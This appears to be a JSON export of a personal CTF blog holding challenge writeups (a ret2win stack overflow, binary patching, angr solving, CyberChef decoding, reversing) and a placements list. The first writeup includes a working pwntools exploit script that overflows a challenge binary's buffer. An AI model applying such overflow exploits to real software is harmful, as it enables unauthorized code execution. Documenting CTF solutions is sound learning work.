[{"content":"Description Can you perform a simple stack smash? I hope so, you\u0026rsquo;ll need to in order to reach the summit\u0026hellip; (100 points)\nGiven file: simple-stack-smash\n Writeup I\u0026rsquo;m going to use GDB with the pwndbg plugin for this challenge. Run gdb \u0026lt;file\u0026gt;\nHere is the main function revealed in Ghidra:\nundefined4 main(void) { char name_input [16]; setvbuf(stdout,(char *)0,2,0); setvbuf(stderr,(char *)0,2,0); printf(\u0026#34;Please enter your name: \u0026#34;); fgets(name_input,1024,stdin); printf(\u0026#34;Hello, %s!\\n\u0026#34;,name_input); return 0; } Curiously, there exists a win function:\nvoid win(void) { system(\u0026#34;cat /src/flag.txt\u0026#34;); exit(0); } A ret2win challenge, where the objective is to redirect execution to the win function (win_addr). To do so, we need to figure out at what point of our input, the buffer overflow occurs (offset).\nIn gdb, info fun win: gives us the win_addr = 0x08049216\nTo find the offset we send a bunch of strings in the following cyclic pattern: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa.. to find until what letter can the stack hold.\n#!/usr/bin/python3 from pwn import * elf = ELF(\u0026#34;./simple-stack-smash\u0026#34;) p = elf.process() win_addr = 0x08049216 context.binary = elf context.log_level = \u0026#34;DEBUG\u0026#34; gdb.attach(p) p.sendline(cyclic(100)) # send pattern p.interactive() # run script, enter \u0026#39;c\u0026#39; in gdb to continue We can see in gdb that the program SEGFAULTed when it\u0026rsquo;s %EIP was pointing to \u0026lsquo;gaaa\u0026rsquo; which caused the buffer overflow. If you\u0026rsquo;re unfamiliar with assembly registers, %EIP is the instruction pointer which tells the computer what the next command is that must be executed. After making %EIP to point to our win function, we get the flag.\n Solve script Completing the script:\n#!/usr/bin/python3 from pwn import * elf = ELF(\u0026#34;./simple-stack-smash\u0026#34;) p = elf.process() win_addr = 0x08049216 context.binary = elf # context.log_level = \u0026#34;DEBUG\u0026#34; # gdb.attach(p) # p.sendline(cyclic(100)) # sending pattern offset = cyclic_find(\u0026#34;gaaa\u0026#34;) p.sendlineafter(b\u0026#34;name: \u0026#34;, b\u0026#34;A\u0026#34; * offset + p32(win_addr)) p.interactive() Flag summitCTF{G1mMI3_S0M3th1NG_H4rD3r_PlZ}\n ","permalink":"/posts/summitctf/simple-stack-smash/","summary":"Easy pwn Challenge - ret2win","title":"Simple Stack Smash (SummitCTF 2023)"},{"content":"Description Ah, the mighty Gunnar the Gatekeeper! He welcomes you to his land, but he is unsure if you are worthy to have the sacred flag. Discover the secret to unlock access to this most prized possesion. (223 points)\nGiven file: GunnarTheGatekeeper\n Writeup Start off by running file on our file. It is an unstripped ELF executable.\nWell then we\u0026rsquo;ve already been rickrolled. (These guys are really good at their ASCII art)\nBut.. this looks like an awful lot like the previous rev challenge from vikeCTF where I used angr to get the flag. Let\u0026rsquo;s see what Ghidra says.\nOkay let me just ctrl+c ctrl+v my solve.py from the prev challenge, slap the success-fail addresses in there just like last time, change the file name annnnndd.. oh it doesn\u0026rsquo;t work. It was worth the 2 mins of work anyways.\nLet\u0026rsquo;s try another 2 min method (this usually never works). I can see a printflag() function that seems to have no parameters.. no server connection.. all client-sided..\nLooking inside the function, its all obfuscated, various calls to stacks and other functions.\nBut what if I just patch the program where on line 30, instead of if iVar1 == 0 I make it if iVar1 != 0 ? So change the JNZ instruction to JZ or in other words, make it so our invalid passphrase reaches the printflag() function.\nif (iVar1 == 0) { fwrite(\u0026#34;\\nYou are unworthy. Here is your punishment:\\n\u0026#34;,1,0x2c,stderr); fwrite(\u0026amp;DAT_0010f420,1,0xe11,stderr); } else { fwrite(\u0026#34;\\nYou are worthy! Here is the flag, the pride of our people:\\n\\n\u0026#34;,1,0x3d,stderr); print_flag(); } After doing so, Ghidra flipped the if and else\u0026rsquo;s pseudocode and thats perfect. Export the program as an ELF, give it an incorrect flag annnddd..\n We\u0026rsquo;ve successfully finessed the system.\nFlag vikeCTF{p4tC#_m3_l1k3_1_0F_uR_fR3Nc#_g1r!s}\n Personal note This was probably the easiest rev challenge that I\u0026rsquo;ve solved but somehow it was listed as a medium. Oh well\n","permalink":"/posts/vikectf/gunnar-the-gatekeeper/","summary":"Medium Reverse Engineering Challenge - patching","title":"Gunnar the Gatekeeper (vikeCTF 2023)"},{"content":"Description Greetings, mere mortal! Are you ready to embark on a journey to unveil the flag and gain the wisdom of the floating Viking head? Harness the power of the oracle\u0026rsquo;s gaze and use his words to guide you towards victory. (100 points)\nGiven file: FloatingVikingHead\n Writeup Running file on our file tells us that it is an unstripped ELF executable. Running it reveals the following: Cool ASCII art, but this shows me that this challenge is a prime candidate for the use of angr. Anytime where the program hits a failure and success point, angr could be used to solve for the flag.\nOpening Ghidra, and looking inside the main method shows us everything we need: the success address, failure address, and base address. Let me explain.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  bool main(void) { int iVar1; long in_FS_OFFSET; char local_38 [40]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); printf( \u0026#34; _.-._\\n.\\\u0026#39;| | `.\\n/ | | \\\\\\n| | | |\\n|____|_|____|\\n|____(_)____|\\n/|(o)| |(o)|\\\\\\n//| | | |\\\\\\\\\\n\\\u0026#39;/| (|_|) |\\\\`\\n//.///|\\\\\\\\\\\\.\\\\\\\\\\n/////---\\\\\\\\\\\\\\ \\\\\\\\n ////|||||\\\\\\\\\\\\\\\\\\n\\\u0026#39;//|||||||\\\\\\\\`\\n\\\u0026#39;|||||||`\\n\\nI am the flag oracle.\\nEnter a flag and I will tell you if it is correct.\\nFlag: \u0026#34; ); iVar1 = 0x1c; fgets(local_38,0x1c,stdin); encrypt(local_38,iVar1); iVar1 = memcmp(\u0026amp;DAT_00102008,local_38,0x1b); if (iVar1 != 0) { fwrite(\u0026#34;Failure, your input does not match the flag :(\\n\u0026#34;,1,0x2f,stderr); } else { fwrite(\u0026#34;Success, your input matches the flag :)\\n\u0026#34;,1,0x28,stderr); } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return iVar1 != 0; }   success_addr = line 21, the address of the call to the fwrite function\nfail_addr = line 18, the address of the call to the fwrite function\nTo find an address of a function, simply click on the name of the function and the corresponding assembly code will be revealed\nbase_addr = scroll ALL the way up to the beginning of the assembly code in Ghidra (usually it\u0026rsquo;s 00100000) flag_len = this could just be the length of the char array (40), line 6. But, if you really wanna get it fully accurate then open encrypt() that reveals:\n1 2 3 4 5 6 7 8 9 10  void encrypt(char *__block,int __edflag) { ulong local_10; for (local_10 = 0; local_10 \u0026lt; 0x1b; local_10 = local_10 + 1) { __block[local_10] = __block[local_10] ^ 0x5d; } return; }   This is a for loop iterating through the chars of our input with local_10 being i. local_10 \u0026lt; 0x1b is i \u0026lt; 27. So our flag is maximum 27 in length.\n Slap all our findings in an angr template or write your own (GIGACHAD move) and run it! (just make sure your binary file is in the same folder as the python file)\nimport angr import claripy base_adr = 0x00100000 success_adr = 0x00101245 fail_adr = 0x0010126f flag_len = 27 # 40 flag_chars = [claripy.BVS(f\u0026#34;flag_char{i}\u0026#34;, 8) for i in range(flag_len)] flag = claripy.Concat(*flag_chars + [claripy.BVV(b\u0026#34;\\n\u0026#34;)]) # angr boilerplate project = angr.Project(\u0026#34;./FloatingVikingHead\u0026#34;, main_opts={\u0026#34;base_addr\u0026#34;: base_adr}) state = project.factory.full_init_state( args=[\u0026#34;./FloatingVikingHead\u0026#34;], add_options=angr.options.unicorn, stdin=flag ) sim_manager = project.factory.simulation_manager(state) sim_manager.explore(find=success_adr, avoid=fail_adr) # adding only printable chars for c in flag_chars: state.solver.add(c \u0026gt;= ord(\u0026#34;!\u0026#34;)) state.solver.add(c \u0026lt;= ord(\u0026#34;~\u0026#34;)) # using stdin file descriptor to interact with program if len(sim_manager.found) \u0026gt; 0: for found in sim_manager.found: print(found.posix.dumps(0)) Flag vikeCTF{n0_57R1n95_F0r_Y0u} solve.py\n Personal note I am by no means an angr expert, but I got the flag using a typical angr template in 5 mins. Mastering angr could mean you would be solving a LOT of rev challanges with ease and I really wanna work towards that.\n","permalink":"/posts/vikectf/floating-viking-head/","summary":"Easy Reverse Engineering Challenge - using angr","title":"Floating Viking Head (vikeCTF 2023)"},{"content":"Description I\u0026rsquo;ve been sitting here for days, listening to the radio and writing down dots and dashes. I\u0026rsquo;m starting to feel like one of those old-timey codebreakers, you know? To be honest, I have no idea what it all means! Think you can help me out? (100 points)\nGiven file: 1N73rC3P710N.enc\n Writeup Upon opening the file, it appears to be morse code with dots . and dashes -\nLet\u0026rsquo;s open up CyberChef and slap our morse code as the input with the From Morse Code recipe\nOur decoded morse code is a bunch of T and F in groups of 8. Looks a lot like binary so lets replace T -\u0026gt; 1 and F -\u0026gt; 0. Use Find / Replace recipes and drag them below our previous recipe.\nAfter replacement of 0s and 1s use a From Binary with Space delimiter and byte length of 8\n Whenever you see an equal sign at the end of a bunch of random alphabetic characters, it usually means that the string is encoded with base 64, but let\u0026rsquo;s use the magic recipe that tries a bunch of decoding methods.\nYou can see it\u0026rsquo;s suggesting the From Base64 recipe. Click the suggestion to load it.\nOur output is now: 80.85.51.70.75.77.75.83.74.73.50.72.83.83.83.55.71.52.90.84.77.88.90.86.80.69.90.86.69.78.66.84.80.69.52.70.54.77.50.76.71.66.70.72.87.84.75.66.74.74.87.72.69.52.68.68\nThose numbers look to be in the range of 32-127 which is the range of ASCII printable character codes which means we need a From Decimal recipe. The From Decimal recipe doesn\u0026rsquo;t support dot . as a delimiter.\nSo, let\u0026rsquo;s find and replace again. Replacing dot with comma, since it\u0026rsquo;s a supported delimiter. \\. -\u0026gt; ,\nNow we can use From Decimal:\nAfter using Magic again, it suggests From Base32 so let\u0026rsquo;s insert that.\nThe result is }6U1RJ4yJ_736_5y3R43y8_3K0J{MAJlrpc\nRemember the flag format is vikeCTF{}. We can see that there is 7 characters after { at the very end. 3 of which are lower-case with 4 upper. Just enough for vikeCTF but in reverse!\nApply the Reverse recipe to get cprlJAM{J0K3_8y34R3y5_637_Jy4JR1U6}\nSeems like if we apply magic again, there is no suggestions. Let\u0026rsquo;s try a cipher identifier\nThe strongest suggestions are Affine Cipher and Mono-alphabetic Substitution. Let\u0026rsquo;s try Affine Cipher first. After entering our cipher text, click on Auto Brute Force Decryption.\nctrl + F for vike and voila! Among the hundreds of results, we see our flag.\nFlag vikeCTF{C0D3_8r34K3r5_637_Cr4CK1N6}\nCyberChef Recipe\n Personal note I\u0026rsquo;m a big F1 fan and today\u0026rsquo;s FIA judgement was abysmal (as always), demoting Alonso to 4th place after they took 2hrs to analyze a single jpeg. But Alonso is GOATED so he still celebrated his podium. EDIT: LOOKS LIKE THEY GAVE 3RD BACK TO HIM YAYY!\n","permalink":"/posts/vikectf/cipher-cracking/","summary":"Easy Cryptography Challenge - using CyberChef","title":"Cipher Cracking (vikeCTF 2023)"},{"content":"Description Don\u0026rsquo;t you love taking finals? Don\u0026rsquo;t you wish you could do it not only during finals week, but during every week? Fret no more, Finals Simulator 2023 has got your back! If you install now and get an A+ on your simulated final, you\u0026rsquo;ll even get the limited time Flag DLC for free! Also, after numerous reports of cheating we\u0026rsquo;ve installed an anti-cheating mechanism so people actually have to solve the problem. (267 points)\nGiven file: finals_simulator\n Writeup We can start off by running the command file ./finals_simulator just to see what type of file we\u0026rsquo;re working with here.\nELF 64-bit LSB pie executable, x86-64, ... not stripped It\u0026rsquo;s an executable ELF file and is not stripped meaning it still contains debugging info. So, it\u0026rsquo;ll be easier for us to figure out what the program is doing later in Ghidra.\nLet\u0026rsquo;s run the program:\n$ ./finals_simulator Welcome to Finals Simulator 2023: Math Edition! Question #1: What is sin(x)/n? asd Wrong! You failed. Queue up Ghidra! If you are unfamiliar with Ghidra, it is a free decompiler developed by the NSA (yeah the US one).\nUpon opening, create a new non-shared project, and then hit I to import a file. After importing, double click the file and hit analyze. On the left side, locate Symbol Tree -\u0026gt; Functions -\u0026gt; main\nWe can see the main function in assembly in the middle of the screen, and a decompiled C pseudocode on the right (picture above). Immediately, the questions asked are visible.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  undefined8 main(void) { int iVar1; size_t sVar2; int local_11c; char input [264]; char *i; puts(\u0026#34;Welcome to Finals Simulator 2023: Math Edition!\u0026#34;); printf(\u0026#34;Question #1: What is sin(x)/n? \u0026#34;); fflush(stdout); fgets(input,0x100,stdin); sVar2 = strcspn(input,\u0026#34;\\n\u0026#34;); input[sVar2] = \u0026#39;\\0\u0026#39;; iVar1 = strcmp(input,\u0026#34;six\u0026#34;); if (iVar1 == 0) { printf(\u0026#34;Question #2: What\\\u0026#39;s the prettiest number? \u0026#34;); fflush(stdout); __isoc99_scanf(\u0026amp;DAT_001020c3,\u0026amp;local_11c); if ((local_11c + 0x58) * 0x2a == 0x2179556a) { printf(\u0026#34;Question #3: What\\\u0026#39;s the integral of 1/cabin dcabin? \u0026#34;); fflush(stdout); getchar(); fgets(input,0x100,stdin); sVar2 = strcspn(input,\u0026#34;\\n\u0026#34;); input[sVar2] = \u0026#39;\\0\u0026#39;; for (i = input; *i != \u0026#39;\\0\u0026#39;; i = i + 1) { *i = (char)((long)(*i * 0x11) % 0xfd); } putchar(10); iVar1 = strcmp(input,enc); if (iVar1 == 0) { puts(\u0026#34;Wow! A 100%! You must be really good at math! Here, have a flag as a reward.\u0026#34;); print_flag(); } else { puts(\u0026#34;Wrong! You failed.\u0026#34;); } } else { puts(\u0026#34;Wrong! You failed.\u0026#34;); } } else { puts(\u0026#34;Wrong! You failed.\u0026#34;); } return 0; }   Question 1 Line 16: there is a strcmp() which will set iVar1 to 0 if the local_118 is the same as six. There is our 1st answer, but lets also rename local_118 -\u0026gt; input (already applied above) so we can read the code better. (Select the text and hit L to rename)\nQuestion 2 Line 21: we can see local_11c is being read and with some operations must equal 0x2179556a. When it does, we see the next question. Right clicking these hex values reveals the decimals.\nAll we have to do here is find x: ((x + 88) * 42 == 561599850) which is 13371337\nQuestion 3 Let\u0026rsquo;s look at the for loop on line 28. The counter seems to be local_10 since +1 is being added to it after iteration. Rename local_10 -\u0026gt; i (already applied above). So, the loop is basically iterating through all characters of input (notice i = input).\nInside the loop, the chars of our input is being encoded with various operations. Line 32: This encoded input now is being checked against enc and if they match, the printflag() reads a txt file containing the flag on the server (remember we connect to the server to get the flag).\nLet\u0026rsquo;s take a look at enc (double click it in the decompiler view): Looks like some sort of a hex array. We have to decode this based on line 29.\nenc = (\u0026#34;0E\u0026#34;, \u0026#34;C9\u0026#34;, \u0026#34;9D\u0026#34;, \u0026#34;B8\u0026#34;, \u0026#34;26\u0026#34;, \u0026#34;83\u0026#34;, \u0026#34;26\u0026#34;, \u0026#34;41\u0026#34;, \u0026#34;74\u0026#34;, \u0026#34;E9\u0026#34;, \u0026#34;26\u0026#34;, \u0026#34;A5\u0026#34;, \u0026#34;83\u0026#34;, \u0026#34;94\u0026#34;, \u0026#34;0E\u0026#34;, \u0026#34;63\u0026#34;, \u0026#34;37\u0026#34;, \u0026#34;37\u0026#34;, \u0026#34;37\u0026#34;) flag = [] for hex in enc: dec = int(hex, 16) # decimal representation of enc values (16 bits in a hex) x = 0 while (((x * 17) % 253) != dec): x += 1 # finding what int would satisfy our dec flag.append(chr(x)) # adding the text representation of x to flag print(\u0026#39;\u0026#39;.join(flag)) # print flag Output: it's a log cabin!!!\nFlag After entering the answers (six, 13371337, it's a log cabin!!!)we get: lactf{im_n0t_qu1t3_sur3_th4ts_h0w_m4th_w0rks_bu7_0k}\n Personal note Just wanna end off by saying thank you for reading this, it was my first writeup and my entire inspiration to setup this website and do this writeup was thanks to LACTF and Boschko.\n","permalink":"/posts/lactf/finals-simulator/","summary":"Easy Reverse Engineering Challenge - my first write up!","title":"finals-simulator (LACTF 2023)"},{"content":"CTFTime Team ID: Inodes\nCTFTime ID: doxxedd\nRingZer0: doxxedd\npicoCTF: doxxedd\n QCTF 2024  1st in Queen\u0026rsquo;s / 4th Overall Team: Inodes Mar 31st, 2024  picoCTF 2024  Top 6% globally / 412th: Scoreboard Team: Inodes Mar 12-26, 2024  SummitCTF 2023  Top 19% / 20th: Scoreboard Team: Inodes Apr 15-16, 2023  picoCTF 2023  Top 10% globally and 249th within undergrad students Scoreboard Team: Inodes Mar 14-28, 2023  HTB Cyber Apocalypse 2023: The Cursed Mission  Top 30%: Scoreboard Team: Inodes Mar 18-23, 2023  vikeCTF 2023  Top 18% / 36th: Scoreboard My writeup won Best \u0026ldquo;Unintended\u0026rdquo; Team: Inodes Mar 17-19, 2023  LACTF 2023  Top 31%: Scoreboard Team: Inodes Feb 10-12, 2023  QCTF 2023  5th place: Scoreboard Team: Zer0 D4y 0utl4ws Jan 21st, 2023  ","permalink":"/placements/","summary":"CTFTime Team ID: Inodes\nCTFTime ID: doxxedd\nRingZer0: doxxedd\npicoCTF: doxxedd\n QCTF 2024  1st in Queen\u0026rsquo;s / 4th Overall Team: Inodes Mar 31st, 2024  picoCTF 2024  Top 6% globally / 412th: Scoreboard Team: Inodes Mar 12-26, 2024  SummitCTF 2023  Top 19% / 20th: Scoreboard Team: Inodes Apr 15-16, 2023  picoCTF 2023  Top 10% globally and 249th within undergrad students Scoreboard Team: Inodes Mar 14-28, 2023  HTB Cyber Apocalypse 2023: The Cursed Mission  Top 30%: Scoreboard Team: Inodes Mar 18-23, 2023  vikeCTF 2023  Top 18% / 36th: Scoreboard My writeup won Best \u0026ldquo;Unintended\u0026rdquo; Team: Inodes Mar 17-19, 2023  LACTF 2023  Top 31%: Scoreboard Team: Inodes Feb 10-12, 2023  QCTF 2023  5th place: Scoreboard Team: Zer0 D4y 0utl4ws Jan 21st, 2023  ","title":"Past CTF Placements 🏆"}]